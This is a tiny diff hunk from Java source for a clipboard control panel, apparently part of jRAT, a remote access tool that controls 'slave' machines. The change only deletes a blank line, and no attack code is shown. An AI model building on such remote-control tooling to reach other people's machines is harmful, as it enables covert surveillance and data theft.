@@ -15,7 +15,6 @@ import javax.swing.ScrollPaneConstants;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet59Clipboard;
 
-
 @SuppressWarnings("serial")
 public class PanelControlClipboard extends PanelControlParent {
 
